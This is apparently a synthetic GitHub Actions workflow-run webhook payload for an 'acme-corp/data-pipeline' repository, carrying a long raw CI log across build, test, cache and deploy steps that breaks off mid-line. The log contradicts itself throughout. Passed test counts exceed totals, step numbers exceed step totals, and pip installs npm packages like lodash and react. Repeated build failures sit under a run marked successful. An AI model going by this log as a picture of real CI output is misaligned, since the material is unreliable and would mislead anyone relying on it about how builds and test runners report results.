{
  "action": "completed",
  "workflow_run": {
    "id": 838,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "05951afa0b98dbf1ae253ac99223f42de1def2f6",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-17T12:47:42.203923Z",
    "updated_at": "2025-12-17T12:52:19.126464Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: upload_artifacts ===\n[12:47:42] INFO: Connecting to database\npip: Downloading lodash-3.11.tar.gz\nAlready up to date.\n[12:47:42] INFO: Connecting to database\nnpm notice: package.json updated\n[12:47:42] DEBUG: Loading configuration\nSuccess!\nCache invalidated: build\nStep 1/15: Running migrations\n[12:47:42] INFO: Request completed\nCompiling src/main.py...\nCoverage: 95% statements, 85% branches\nCompiling src/service.java...\n  PASS: integration/test_api_health.spec.js\npip: Downloading react-5.18.tar.gz\nCompiling src/index.js...\nImage pulled successfully\nFAILED: test_db_connect\nSwitched to branch 'hotfix/task-922'\n\u2713 Task completed in 2912ms\n[12:47:42] INFO: Connecting to database\nArtifact downloaded: 11MB\nTransforming 355 files...\nStep 10/21: Installing dependencies\nChecking out main branch\nImage pulled successfully\nFinished.\nCompiling utils/handler.rs...\nLayer 5/12: COPY command\nLoading...\npip install: Successfully installed eslint-1.17\nGenerating source maps...\n[12:47:42] DEBUG: Initializing service\n[12:47:42] ERROR: Connection failed\nReady.\n[12:47:42] INFO: Request completed\nImage pulled successfully\npip install: Successfully installed prettier-4.17\nProcessing...\nTests: 457 passed, 294 total\npip install: Successfully installed webpack-4.2\nMinifying app.js\nUsing Python 3.10\nBundling styles.js\n[12:47:42] INFO: Request completed\n\u2717 build failed with exit code 23\nCache miss for key-6265\nTransforming 954 files...\n[12:47:42] DEBUG: Initializing service\nTest Suites: 44 passed, 34 total\n[12:47:42] DEBUG: Query executed in 96ms\nnpm notice: created a lockfile\nOK\nStep 20/24: Running migrations\npip: Collecting express\nDone.\nnpm install: added 235 packages\nPulling image: node:3.11\n[12:47:42] DEBUG: Initializing service\nArtifact uploaded: dist.zip (4MB)\nUsing Python 3.11\nSnapshots: 5 passed, 15 total\nCompiling utils/main.py...\nUploading artifact 'coverage' (5 files)\nnpm install: added 366 packages\nArtifact uploaded: build.tar.gz (25MB)\nCache restored successfully (307MB)\nRan 70 tests in 51s\nSnapshots: 38 passed, 25 total\nHEAD is now at 852e63e\n[12:47:42] ERROR: Connection failed\nnpm install: added 312 packages\nStep 7/20: Testing\nCreating production build...\nStep 17/15: Deploying\nOK\nnpm install: resolved 1168 packages\n[12:47:42] INFO: Connecting to database\npip install: Successfully installed axios-5.5\nArtifact uploaded: build.tar.gz (46MB)\nRan 14 tests in 45s\n[12:47:42] DEBUG: Memory usage: 1082MB\nCache miss for key-6223\nLayer 4/15: COPY command\nHEAD is now at 0af6322\nTransforming 135 files...\nBuilding Docker image...\nStep 11/24: Deploying\nImage pulled successfully\nGET /health - 201 (40ms)\nCache restored successfully (483MB)\nWARNING: webpack has known vulnerabilities\n[12:47:42] DEBUG: Initializing service\nPlatform: win32-x64\nRan 154 tests in 11s\nLoading...\n[12:47:42] INFO: Cache refreshed\nSwitched to branch 'hotfix/task-595'\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 16.64s\nCompiling components/service.java...\nConnection established\nCoverage: 99% statements, 79% branches\nOptimizing 21 modules...\n\u2713 Step 'setup' succeeded\nWARNING: prettier has known vulnerabilities\nStep 7/25: Testing\nMinifying app.js\n  PASS: test_cache_hit (230ms)\nLayer 5/10: ENV command\nCompiling src/main.py...\nReady.\nConnection established\nStep 3/22: Running migrations\n[12:47:42] DEBUG: Memory usage: 133MB\nTime: 2.702s\nVerifying...\n\u2713 Task completed in 732ms\nEnvironment: production\nTest Suites: 27 passed, 50 total\nTest Suites: 8 passed, 11 total\nWARNING: lodash has known vulnerabilities\nWaiting...\n[12:47:42] INFO: Request completed\nCache hit for key-7468\n\u2713 deploy completed\nUsing Node.js 19.13.2\n  PASS: e2e/test_api_health.spec.js\nCoverage: 75% statements, 71% branches\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://npmjs.org/package.json\n[12:47:42] INFO: Request completed\nChecking out develop branch\nBuilding Docker image...\n[12:47:42] DEBUG: Connection pool: 9 active\nPOST /api - 202 (458ms)\nnpm install: resolved 1853 packages\nCompiling components/service.java...\n[12:47:42] DEBUG: Initializing service\n[12:47:42] DEBUG: Query executed in 59ms\n[12:47:42] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\nUsing Python 3.10\n[12:47:42] INFO: Request completed\n[12:47:42] INFO: Cache refreshed\nBuilding Docker image...\n[12:47:42] DEBUG: Memory usage: 1821MB\nCompiling src/main.py...\nAlready up to date.\nLayer 4/14: RUN command\n[12:47:42] INFO: Request completed\nOptimizing 18 modules...\nCompiling lib/service.java...\nProcessing...\nAlready up to date.\nUsing Python 3.12\n[12:47:42] INFO: Connecting to database\nChecking out main branch\nPlatform: win32-x64\nCache saved successfully\nStep 1/19: Installing dependencies\nUploading artifact 'dist' (43 files)\nStep 9/16: Running migrations\n[12:47:42] DEBUG: Loading configuration\n[12:47:42] INFO: Starting build process\nCache saved successfully\n\u2717 build failed with exit code 26\nCreating production build...\nUploading artifact 'dist' (43 files)\n=== Step upload_artifacts completed ===\n=== Step: build ===\n\u2717 build failed with exit code 13\n[12:47:42] DEBUG: Initializing service\nCache miss for key-8881\nStep 7/24: Installing dependencies\nPulling image: python:latest\n[12:47:42] INFO: Connecting to database\n  PASS: e2e/test_api_health.spec.js\nChecking out develop branch\nMinifying main.js\n[12:47:42] DEBUG: Loading configuration\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'feature/task-613'\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (217ms)\nSwitched to branch 'feature/task-480'\nCreating production build...\npip: Installing build dependencies...\n[12:47:42] INFO: Processing request\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'test' succeeded\n\u2717 build failed with exit code 19\n  PASS: e2e/test_user_create.spec.js\n\u2713 Task completed in 4309ms\nFinished.\nTransforming 794 files...\n\u2713 build completed\nyarn add: Done in 4.16s\nTime: 106.593s\nStep 6/18: Running migrations\nRan 15 tests in 33s\nTests: 427 passed, 147 total\nTests: 467 passed, 271 total\nCache saved successfully\nOptimizing 32 modules...\n[12:47:42] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nDone.\nPushing to registry...\n[12:47:42] DEBUG: Memory usage: 1527MB\nFetching from https://gcr.io/package.json\nStep 1/25: Deploying\nStep 7/20: Deploying\n[12:47:42] DEBUG: Initializing service\nStep 1/18: Installing dependencies\nImage pulled successfully\n[12:47:42] INFO: Connecting to database\nWARNING: webpack has known vulnerabilities\nRan 120 tests in 16s\nCompiling lib/service.java...\nPulling image: alpine:latest\n[12:47:42] INFO: Starting build process\nFetching from https://github.com/package.json\nMinifying main.js\n\u2713 package completed\nFinished.\n  PASS: test_api_health (395ms)\nFetching submodules...\nPushing to registry...\nUsing Python 3.9\n\u2717 build failed with exit code 111\nSnapshots: 48 passed, 31 total\nPOST /data - 202 (69ms)\nNODE_ENV=test\nChecking out master branch\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\nSuccess!\n\u2713 All checks passed\nnpm notice: package.json updated\nUsing Node.js 15.4.8\n[12:47:42] INFO: Connecting to database\nCompiling src/app.ts...\nSnapshots: 25 passed, 30 total\nCache miss for key-8022\nAlready up to date.\nEnvironment: test\nPlatform: win32-x64\n[12:47:42] INFO: Connecting to database\n[12:47:42] INFO: Request completed\n[12:47:42] INFO: Request completed\n[12:47:42] INFO: Processing request\n\u2717 build failed with exit code 98\nOK\n[12:47:42] ERROR: Connection failed\n  PASS: test_db_connect (218ms)\nWARNING: react has known vulnerabilities\nVerifying...\nUploading artifact 'coverage' (20 files)\nnpm notice: created a lockfile\npip: Collecting react\nUsing Python 3.10\nnpm install: resolved 685 packages\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-9394\n[12:47:42] DEBUG: Connection pool: 5 active\nOK\nFetching from https://googleapis.com/package.json\nWARNING: axios has known vulnerabilities\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nNODE_ENV=development\nException: NullPointerException\nAlready up to date.\nProcessing...\nCoverage: 96% statements, 78% branches\nCreating production build...\nEnvironment: production\n[12:47:42] INFO: Request completed\n[12:47:42] DEBUG: Loading configuration\nFetching from https://github.com/package.json\n\u2713 validate completed\nUploading artifact 'coverage' (32 files)\nWARNING: express has known vulnerabilities\n[12:47:42] INFO: Starting build process\nSuccess!\nCache restored successfully (239MB)\nConnection established\nTest Suites: 12 passed, 6 total\nCompiling lib/app.ts...\nTLS handshake completed\n  PASS: e2e/test_cache_hit.spec.js\nPulling image: alpine:18\nStep 18/18: Testing\nCoverage: 75% statements, 71% branches\n[12:47:42] INFO: Cache refreshed\nUsing Node.js 14.11.9\nGenerating source maps...\nArtifact uploaded: dist.zip (49MB)\nFetching submodules...\nChecking out develop branch\nFetching from https://amazonaws.com/package.json\nNODE_ENV=development\nCreating production build...\nSuccess!\npip: Collecting react\nFetching from https://docker.io/package.json\nEnvironment: test\nyarn add: Done in 10.65s\nCompleted.\n[12:47:42] DEBUG: Loading configuration\n[12:47:42] INFO: Starting build process\nBuilding Docker image...\nCache saved successfully\nStep 13/22: Deploying\n[12:47:42] DEBUG: Initializing service\n  PASS: test_auth_login (412ms)\nCompiling components/utils.go...\nSnapshots: 9 passed, 46 total\nPushing to registry...\nFetching from https://npmjs.org/package.json\nnpm notice: created a lockfile\nUploading artifact 'coverage' (22 files)\nnpm notice: package.json updated\nOK\nTime: 47.895s\nCompiling lib/app.ts...\nUsing Python 3.10\nPOST /data - 202 (485ms)\nBuilding Docker image...\nSnapshots: 0 passed, 0 total\nCreating production build...\npip: Downloading lodash-2.4.tar.gz\nLayer 7/13: RUN command\npip: Collecting react\nMinifying main.js\nStep 7/25: Testing\nInstalling eslint@4.15.0\n=== Step build completed ===\n=== Step: save_cache ===\nArtifact downloaded: 13MB\n[12:47:42] ERROR: Connection failed\n[12:47:42] DEBUG: Memory usage: 264MB\nUsing Node.js 14.20.5\nOptimizing 42 modules...\npip: Collecting eslint\nArtifact uploaded: dist.zip (87MB)\n[12:47:42] DEBUG: Connection pool: 4 active\nnpm notice: created a lockfile\nyarn add: Done in 3.72s\nCoverage: 92% statements, 64% branches\nDone.\nStep 4/24: Linting\nCompiling utils/service.java...\npip: Downloading express-2.13.tar.gz\nFinished.\nImage pulled successfully\nLoading...\nTest Suites: 41 passed, 6 total\nVerifying...\nTests: 200 passed, 77 total\nCache miss for key-5227\nnpm notice: created a lockfile\nArtifact downloaded: 36MB\npip: Installing build dependencies...\nCache invalidated: dependencies\nTransforming 702 files...\nException: NullPointerException\n[12:47:42] INFO: Cache refreshed\nPlatform: win32-x64\n[12:47:42] DEBUG: Connection pool: 14 active\nFetching submodules...\nCompiling utils/utils.go...\nBundling styles.css\nStep 12/15: Building\nCompiling src/service.java...\npip: Downloading prettier-5.12.tar.gz\nStep 5/24: Testing\nSwitched to branch 'bugfix/task-274'\n[12:47:42] DEBUG: Initializing service\n\u2713 Step 'checkout' succeeded\nFetching submodules...\nCoverage: 96% statements, 75% branches\n\u2713 Step 'install' succeeded\nProcessing...\nTest Suites: 16 passed, 22 total\nException: RuntimeError\nUsing Python 3.12\nConnection established\nPulling image: node:3.11\nyarn add: Done in 9.80s\nSnapshots: 9 passed, 48 total\nSwitched to branch 'hotfix/task-126'\nPulling image: alpine:3.11\nCompiling utils/main.py...\n\u2713 All checks passed\nStep 3/15: Installing dependencies\nHEAD is now at cb6d380\nProcessing...\nHEAD is now at acfa1cc\nCache hit for key-4239\n[12:47:42] INFO: Starting build process\nConnection established\nnpm notice: package.json updated\nWARNING: webpack has known vulnerabilities\n[12:47:42] DEBUG: Memory usage: 112MB\npip: Collecting axios\nNODE_ENV=test\nImage pulled successfully\npip: Collecting webpack\nMinifying vendor.js\nOptimizing 82 modules...\nArtifact downloaded: 6MB\nMinifying app.js\nCache invalidated: node_modules\nDone.\nBundling runtime.css\n[12:47:42] INFO: Connecting to database\nyarn add: Done in 29.59s\n[12:47:42] INFO: Starting build process\n[12:47:42] INFO: Connecting to database\nMinifying app.js\npip: Collecting eslint\nStep 14/19: Installing dependencies\nGenerating source maps...\nPlatform: darwin-arm64\n[12:47:42] WARN: Deprecated API usage\nWaiting...\nUsing Node.js 15.18.10\nPOST /api - 202 (476ms)\n[12:47:42] WARN: Deprecated API usage\n\u2713 validate completed\nConnection established\n\u2713 Task completed in 4357ms\nFinished.\nOptimizing 42 modules...\nOK\n\u2713 Task completed in 3345ms\n[12:47:42] DEBUG: Query executed in 19ms\n  PASS: e2e/test_db_connect.spec.js\npip: Collecting webpack\n[12:47:42] DEBUG: Loading configuration\npip: Installing build dependencies...\n\u2713 All checks passed\n[12:47:42] DEBUG: Connection pool: 6 active\nImage pulled successfully\nConnection established\nUsing Python 3.12\n[12:47:42] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 495 passed, 452 total\nCompiling lib/service.java...\nUsing Node.js 17.20.9\nTLS handshake completed\nBundling vendor.js\n[12:47:42] DEBUG: Connection pool: 8 active\npip: Collecting eslint\nPulling image: alpine:latest\nyarn add: Done in 19.8s\nCompleted.\nyarn add: Done in 21.56s\nGET /api - 200 (3ms)\nCompleted.\nAlready up to date.\nnpm notice: created a lockfile\nChecking out main branch\npip: Downloading prettier-5.1.tar.gz\n\u2713 Step 'checkout' succeeded\npip: Installing build dependencies...\nPOST /api - 202 (482ms)\nFetching from https://amazonaws.com/package.json\n\u2713 Task completed in 4003ms\nTransforming 689 files...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 1530c48\nCompiling lib/service.java...\nMinifying main.js\nStep 1/22: Linting\n[12:47:42] DEBUG: Memory usage: 1646MB\nNODE_ENV=development\nTransforming 558 files...\n[12:47:42] INFO: Processing request\nConnection established\nNODE_ENV=test\nCache saved successfully\nBundling vendor.js\n[12:47:42] DEBUG: Memory usage: 1569MB\nnpm install: resolved 788 packages\n\u2713 deploy completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nPulling image: node:18\nCompiling src/service.java...\n[12:47:42] INFO: Processing request\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 24.82s\n[12:47:42] INFO: Request completed\n[12:47:42] INFO: Request completed\nStep 16/20: Linting\nUploading artifact 'dist' (3 files)\n  PASS: unit/test_api_health.spec.js\nPOST /data - 202 (284ms)\n  PASS: unit/test_db_connect.spec.js\n=== Step save_cache completed ===\n=== Step: e2e_tests ===\n\u2713 Step 'install' succeeded\npip: Downloading prettier-4.8.tar.gz\nOptimizing 96 modules...\nUsing Python 3.10\n[12:47:42] DEBUG: Connection pool: 12 active\nSnapshots: 33 passed, 12 total\npip: Installing build dependencies...\nChecking out master branch\n[12:47:42] DEBUG: Memory usage: 1580MB\nTest Suites: 8 passed, 21 total\nnpm install: resolved 1159 packages\nArtifact uploaded: build.tar.gz (23MB)\npip install: Successfully installed webpack-2.4\n\u2713 Step 'install' succeeded\nCompleted.\nWARNING: eslint has known vulnerabilities\n\u2713 Step 'setup' succeeded\nAlready up to date.\n[12:47:42] INFO: Request completed\n[12:47:42] DEBUG: Query executed in 94ms\n[12:47:42] INFO: Starting build process\nTLS handshake completed\nCompiling src/app.ts...\nCompiling utils/app.ts...\nCompiling lib/handler.rs...\nOK\npip install: Successfully installed axios-5.15\nAlready up to date.\nOK\nCompiling lib/handler.rs...\nBuilding Docker image...\nGET /api - 201 (90ms)\nnpm install: resolved 471 packages\npip: Collecting prettier\nWARNING: eslint has known vulnerabilities\n\u2713 Task completed in 3629ms\n  PASS: test_cache_hit (41ms)\nStep 7/23: Deploying\nFinished.\nnpm notice: package.json updated\nCompiling src/main.py...\nFAILED: test_api_health\n[12:47:42] ERROR: Connection failed\nTLS handshake completed\nCache miss for key-8535\nFinished.\nLayer 5/8: ENV command\n[12:47:42] DEBUG: Memory usage: 870MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nRan 83 tests in 32s\nTime: 117.826s\nUsing Python 3.9\nTransforming 241 files...\nCompiling lib/service.java...\n  PASS: test_auth_login (369ms)\nCache restored successfully (463MB)\nArtifact uploaded: dist.zip (58MB)\nTime: 60.388s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:42] DEBUG: Initializing service\nCompiling utils/utils.go...\n\u2713 Task completed in 3810ms\nCompiling components/utils.go...\nLoading...\nnpm install: added 485 packages\nVerifying...\n\u2717 build failed with exit code 81\nPlatform: darwin-arm64\nLayer 5/12: RUN command\nBundling vendor.css\n  PASS: test_db_connect (323ms)\n[12:47:42] DEBUG: Initializing service\n\u2713 All checks passed\nProcessing...\nCompiling lib/app.ts...\nOptimizing 17 modules...\nInstalling react@2.12.7\nArtifact uploaded: build.tar.gz (34MB)\nFinished.\nOptimizing 64 modules...\nProcessing...\n[12:47:42] DEBUG: Memory usage: 1428MB\nFAILED: test_api_health\npip: Installing build dependencies...\nPOST /upload - 201 (127ms)\nBundling styles.js\n[12:47:42] WARN: Deprecated API usage\nPOST /upload - 202 (236ms)\n[12:47:42] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (35MB)\nCache saved successfully\nnpm notice: package.json updated\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 19/20: Testing\n\u2713 package completed\nnpm notice: package.json updated\nMinifying app.js\nTLS handshake completed\n[12:47:42] INFO: Request completed\nStep 16/19: Installing dependencies\n[12:47:42] DEBUG: Query executed in 79ms\nFAILED: test_user_create\nHEAD is now at da2c0de\n\u2717 build failed with exit code 74\nStep 15/22: Testing\n[12:47:42] INFO: Request completed\nFAILED: test_cache_hit\nCompleted.\npip: Installing build dependencies...\n\u2713 Task completed in 4971ms\nTLS handshake completed\nnpm install: added 278 packages\npip: Collecting react\n[12:47:42] DEBUG: Loading configuration\nLoading...\nEnvironment: staging\n[12:47:42] INFO: Starting build process\nDone.\nCompiling components/service.java...\nLayer 6/12: COPY command\nNODE_ENV=production\n[12:47:42] DEBUG: Connection pool: 7 active\n[12:47:42] INFO: Connecting to database\nFinished.\nPushing to registry...\nOK\nCache saved successfully\nCompiling lib/main.py...\nInstalling jest@4.6.10\nCompiling components/index.js...\n[12:47:42] INFO: Starting build process\nCache hit for key-2803\nSwitched to branch 'feature/task-697'\nVerifying...\n\u2713 lint completed\npip: Installing build dependencies...\nWaiting...\n[12:47:42] DEBUG: Memory usage: 1114MB\nEnvironment: test\n[12:47:42] INFO: Processing request\nCompiling lib/service.java...\n[12:47:42] INFO: Starting build process\nSuccess!\nPulling image: python:3.11\nCache miss for key-5054\nCache invalidated: build\nCompiling utils/handler.rs...\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\n[12:47:42] DEBUG: Connection pool: 12 active\nCache miss for key-2464\nSwitched to branch 'bugfix/task-703'\nSuccess!\nSuccess!\nCompiling utils/main.py...\nUsing Node.js 14.1.5\nTime: 116.308s\nRan 37 tests in 43s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.10\nUploading artifact 'dist' (6 files)\nException: RuntimeError\nyarn add: Done in 11.64s\nCreating production build...\nConnection established\nPushing to registry...\n=== Step e2e_tests completed ===\n=== Step: integration_tests ===\nTransforming 566 files...\nConnection established\nTests: 490 passed, 113 total\n[12:47:42] DEBUG: Initializing service\npip: Downloading react-5.18.tar.gz\nFetching submodules...\nDone.\n\u2717 build failed with exit code 25\nnpm notice: created a lockfile\n  PASS: integration/test_api_health.spec.js\nCreating production build...\nnpm notice: package.json updated\nBundling styles.js\n[12:47:42] DEBUG: Loading configuration\nFetching submodules...\n[12:47:42] DEBUG: Query executed in 51ms\n\u2713 All checks passed\nCompiling components/service.java...\nVerifying...\nWARNING: express has known vulnerabilities\nCompiling utils/handler.rs...\nStep 17/17: Building\n[12:47:42] INFO: Cache refreshed\n\u2717 build failed with exit code 32\nFinished.\nnpm install: resolved 1260 packages\nFAILED: test_api_health\nTests: 452 passed, 440 total\n[12:47:42] INFO: Starting build process\nStep 5/15: Building\npip install: Successfully installed webpack-2.5\nCache hit for key-4218\nConnection established\n  PASS: test_auth_login (304ms)\n[12:47:42] INFO: Cache refreshed\n[12:47:42] INFO: Connecting to database\nFAILED: test_auth_login\nPOST /upload - 200 (291ms)\nPOST /api - 200 (200ms)\nUsing Python 3.10\nnpm notice: package.json updated\n[12:47:42] DEBUG: Query executed in 88ms\nArtifact downloaded: 43MB\n[12:47:42] DEBUG: Loading configuration\nAlready up to date.\nTLS handshake completed\nCoverage: 74% statements, 89% branches\n[12:47:42] DEBUG: Loading configuration\nOptimizing 97 modules...\n  PASS: test_db_connect (167ms)\n[12:47:42] DEBUG: Query executed in 5ms\nBuilding Docker image...\n[12:47:42] INFO: Connecting to database\npip: Installing build dependencies...\n[12:47:42] INFO: Processing request\nCache miss for key-9778\nnpm notice: package.json updated\nPOST /upload - 200 (146ms)\nCompiling src/utils.go...\nRan 21 tests in 40s\n[12:47:42] ERROR: Connection failed\n[12:47:42] INFO: Connecting to database\nEnvironment: staging\nArtifact uploaded: dist.zip (37MB)\nBuilding Docker image...\nCache invalidated: build\nTest Suites: 40 passed, 50 total\n[12:47:42] INFO: Cache refreshed\nFAILED: test_db_connect\nProcessing...\nAlready up to date.\nCache miss for key-6820\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 5.652s\nSnapshots: 33 passed, 11 total\nCompiling components/app.ts...\nTests: 499 passed, 427 total\nLayer 4/10: COPY command\nStep 2/19: Deploying\nnpm notice: package.json updated\n\u2713 Step 'test' succeeded\n[12:47:42] INFO: Processing request\npip: Downloading webpack-5.6.tar.gz\nBundling vendor.js\nCompleted.\nProcessing...\nHEAD is now at f756b05\nHEAD is now at 09f4b03\nRan 26 tests in 50s\nSwitched to branch 'bugfix/task-970'\nMinifying app.js\nNODE_ENV=test\nSnapshots: 28 passed, 34 total\nCompiling utils/index.js...\n[12:47:42] DEBUG: Connection pool: 4 active\nFinished.\nStep 10/17: Deploying\nStep 17/16: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:42] DEBUG: Query executed in 31ms\n[12:47:42] INFO: Processing request\n\u2713 Step 'build' succeeded\nSnapshots: 37 passed, 48 total\nCreating production build...\n[12:47:42] DEBUG: Initializing service\n[12:47:42] INFO: Connecting to database\n[12:47:42] INFO: Request completed\nOptimizing 59 modules...\nCompiling src/handler.rs...\n  PASS: test_user_create (30ms)\nnpm notice: package.json updated\nStep 20/21: Installing dependencies\nStep 1/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=production\nPOST /api - 202 (178ms)\nWaiting...\nFAILED: test_cache_hit\nStep 5/22: Linting\nTest Suites: 27 passed, 37 total\nImage pulled successfully\npip: Downloading axios-2.2.tar.gz\n\u2713 Step 'install' succeeded\npip install: Successfully installed express-1.14\nStep 16/24: Linting\nArtifact downloaded: 13MB\nDone.\nCreating production build...\n[12:47:42] INFO: Processing request\nBundling runtime.js\nNODE_ENV=development\nCompiling utils/service.java...\n\u2713 Step 'setup' succeeded\nFetching submodules...\nProcessing...\n\u2713 Step 'checkout' succeeded\nStep 18/17: Testing\nCompleted.\nCache hit for key-3076\nAlready up to date.\n[12:47:42] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: linux-x64\nFetching submodules...\nTLS handshake completed\nCompleted.\nStep 4/20: Running migrations\nReady.\nNODE_ENV=test\nTransforming 864 files...\nFetching submodules...\nAlready up to date.\n[12:47:42] INFO: Starting build process\nPushing to registry...\nCache hit for key-3599\n[12:47:42] DEBUG: Initializing service\nGenerating source maps...\n[12:47:42] DEBUG: Memory usage: 1352MB\nInstalling prettier@5.13.10\nWaiting...\nWARNING: lodash has known vulnerabilities\n[12:47:42] INFO: Processing request\n[12:47:42] INFO: Processing request\nEnvironment: test\n[12:47:42] INFO: Cache refreshed\nUsing Python 3.11\nCache saved successfully\nStep 14/24: Testing\nStep 1/21: Deploying\n=== Step integration_tests completed ===\n=== Step: setup_node ===\n[12:47:42] INFO: Cache refreshed\nCoverage: 91% statements, 95% branches\n[12:47:42] INFO: Processing request\nnpm install: added 486 packages\nBundling vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:42] DEBUG: Connection pool: 1 active\n[12:47:42] INFO: Processing request\nyarn add: Done in 18.96s\nnpm install: added 233 packages\nBundling vendor.js\nTLS handshake completed\nBuilding Docker image...\nEnvironment: staging\nCache restored successfully (180MB)\n\u2713 Task completed in 1763ms\nFetching from https://githubusercontent.com/package.json\nnpm install: added 182 packages\n  PASS: integration/test_auth_login.spec.js\nSuccess!\nCompiling components/handler.rs...\nDone.\nFinished.\nException: NullPointerException\nOK\nFinished.\nTime: 2.380s\nCache saved successfully\nLayer 2/10: ENV command\nTime: 80.510s\n[12:47:42] DEBUG: Loading configuration\nException: TypeError\nDone.\nWARNING: prettier has known vulnerabilities\nStep 3/23: Installing dependencies\nRan 115 tests in 14s\nProcessing...\nPushing to registry...\nGET /api - 200 (70ms)\npip: Installing build dependencies...\n[12:47:42] DEBUG: Loading configuration\nTime: 64.726s\npip: Collecting webpack\n[12:47:42] INFO: Processing request\nBuilding Docker image...\n\u2713 All checks passed\nUsing Python 3.9\nTransforming 447 files...\nCache miss for key-6598\n[12:47:42] INFO: Processing request\nUsing Python 3.9\n[12:47:42] DEBUG: Connection pool: 14 active\nStep 3/25: Testing\nSwitched to branch 'bugfix/task-173'\nRan 135 tests in 37s\nLayer 5/10: ENV command\nCreating production build...\nStep 2/19: Deploying\nImage pulled successfully\nGenerating source maps...\npip: Downloading axios-1.11.tar.gz\nNODE_ENV=test\nUsing Node.js 17.3.7\nImage pulled successfully\nWARNING: lodash has known vulnerabilities\nNODE_ENV=development\nCoverage: 71% statements, 78% branches\nCompiling utils/utils.go...\nArtifact uploaded: dist.zip (9MB)\nArtifact uploaded: build.tar.gz (28MB)\nPOST /api - 201 (461ms)\nAlready up to date.\nTLS handshake completed\n[12:47:42] WARN: Deprecated API usage\nPushing to registry...\nOK\nVerifying...\nFetching submodules...\nArtifact uploaded: dist.zip (78MB)\n[12:47:42] DEBUG: Connection pool: 1 active\nEnvironment: test\nGET /health - 201 (93ms)\n[12:47:42] INFO: Starting build process\n  PASS: unit/test_auth_login.spec.js\nCache invalidated: dependencies\nAlready up to date.\nCompiling components/main.py...\n[12:47:42] DEBUG: Connection pool: 5 active\nStep 5/16: Installing dependencies\nMinifying main.js\nCompiling src/service.java...\nArtifact uploaded: dist.zip (35MB)\n\u2713 lint completed\nUploading artifact 'dist' (40 files)\npip: Installing build dependencies...\nFetching submodules...\nProcessing...\nOptimizing 38 modules...\nCompiling src/index.js...\nSnapshots: 25 passed, 33 total\nLoading...\nAlready up to date.\nCompiling components/main.py...\nSnapshots: 8 passed, 33 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:42] INFO: Processing request\n[12:47:42] DEBUG: Initializing service\npip: Collecting jest\n[12:47:42] WARN: Deprecated API usage\n\u2713 Task completed in 2454ms\nWaiting...\nStep 12/19: Linting\nPulling image: python:3.11\nUsing Node.js 20.14.1\nArtifact uploaded: build.tar.gz (10MB)\n\u2717 build failed with exit code 49\nPulling image: alpine:3.11\nGenerating source maps...\nUploading artifact 'build' (35 files)\nDone.\nCreating production build...\nSuccess!\nUsing Node.js 18.10.2\nStep 16/19: Deploying\nLoading...\nWARNING: lodash has known vulnerabilities\nNODE_ENV=development\nSwitched to branch 'feature/task-851'\nnpm notice: package.json updated\nCache invalidated: build\nnpm install: added 479 packages\nCache hit for key-1163\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 Step 'setup' succeeded\nSnapshots: 44 passed, 24 total\nCompleted.\nPulling image: alpine:latest\n\u2713 Step 'build' succeeded\nPushing to registry...\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /api - 200 (68ms)\nChecking out master branch\nStep 16/24: Deploying\nBuilding Docker image...\nCache saved successfully\nnpm install: added 316 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed eslint-1.5\nUsing Node.js 17.19.2\nBundling vendor.css\nException: ValueError\nAlready up to date.\nMinifying main.js\n\u2713 All checks passed\nAlready up to date.\nFetching from https://npmjs.org/package.json\nCache restored successfully (481MB)\nnpm install: added 135 packages\n[12:47:42] DEBUG: Connection pool: 17 active\nSnapshots: 11 passed, 21 total\n\u2713 Task completed in 758ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:42] ERROR: Connection failed\n\u2713 Task completed in 3989ms\nHEAD is now at eaa74db\nWARNING: eslint has known vulnerabilities\nSuccess!\n[12:47:42] DEBUG: Memory usage: 618MB\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nyarn add: Done in 26.43s\nCache saved successfully\npip: Downloading lodash-4.20.tar.gz\nCompiling lib/index.js...\nCoverage: 91% statements, 90% branches\nPOST /upload - 202 (155ms)\nUploading artifact 'dist' (9 files)\n[12:47:42] INFO: Processing request\n\u2713 Task completed in 3244ms\nnpm install: 